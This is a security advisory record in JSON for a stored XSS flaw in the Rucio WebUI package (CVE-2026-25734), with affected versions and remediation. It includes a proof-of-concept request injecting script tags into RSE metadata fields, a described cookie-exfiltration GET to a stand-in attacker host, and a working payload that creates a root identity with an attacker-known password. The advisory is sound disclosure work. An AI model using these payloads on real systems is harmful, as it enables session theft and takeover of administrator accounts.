{
  "Severity": "MODERATE",
  "UpdatedAt": "2026-02-25T19:29:23Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "rucio-webui"
  },
  "Advisory": {
    "DatabaseId": 339304,
    "Id": "GSA_kwCzR0hTQS1oOWZwLXAycDktODczcc4ABS1o",
    "GhsaId": "GHSA-h9fp-p2p9-873q",
    "References": [
      {
        "Url": "https://github.com/rucio/rucio/security/advisories/GHSA-h9fp-p2p9-873q"
      },
      {
        "Url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/35.8.3"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/38.5.4"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/39.3.1"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25734"
      },
      {
        "Url": "https://github.com/advisories/GHSA-h9fp-p2p9-873q"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-h9fp-p2p9-873q"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-25734"
      }
    ],
    "Description": "### Summary\nA stored Cross-site Scripting (XSS) vulnerability was identified in the RSE metadata of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.\n\n---\n### Details\nSeveral metadata fields accept arbitrary input which is stored and later rendered unsafely in the WebUI when the RSEs are listed in the RSE Management dashboard.\n\n**Create Path**:  \nAdmin \u003e RSE Management\n\n**Trigger Paths**:  \nAdmin \u003e RSE Management  \nAdmin \u003e RSE Management \u003e _RSE NAME_\n\n**Vulnerable Attributes**:  \nCity, Country_Name, ISP\n\n**Request**\n```http\nPOST /proxy/rses/XSSTEST HTTP/1.1\n...\n{\"city\":\"\u003cscript\u003ealert('CITY XSS')\u003c/script\u003e\",\"country_name\":\"\u003cscript\u003ealert('COUNTRY XSS')\u003c/script\u003e\",\"ISP\":\"\u003cscript\u003ealert('ISP XSS')\u003c/script\u003e\",\"deterministic\":false,\"volatile\":false,\"staging_area\":false}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n...\nCreated\n```\n\n**Stored XSS payload triggering in RSE listing after adding XSS payload in metadata**\n\u003cimg width=\"1252\" height=\"624\" alt=\"Stored XSS payload triggering in RSE listing after adding XSS payload in metadata\" src=\"https://github.com/user-attachments/assets/6546fc95-0c81-4db7-9271-37b5d4bc8f47\" /\u003e\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\nAttackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload to Create Root UserPass**\n```html\n\u003cimg src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()\u003e\n```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n- Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n\u003e Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-25T19:29:22Z",
    "Severity": "MODERATE",
    "Summary": " Rucio WebUI has Stored Cross-site Scripting (XSS) in RSE Metadata",
    "UpdatedAt": "2026-02-27T21:50:15Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 6.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "39.3.1"
      },
      "VulnerableVersionRange": "\u003e= 39.0.0rc1, \u003c 39.3.1"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "38.5.4"
      },
      "VulnerableVersionRange": "\u003e= 36.0.0rc1, \u003c 38.5.4"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "35.8.3"
      },
      "VulnerableVersionRange": "\u003c 35.8.3"
    }
  ]
}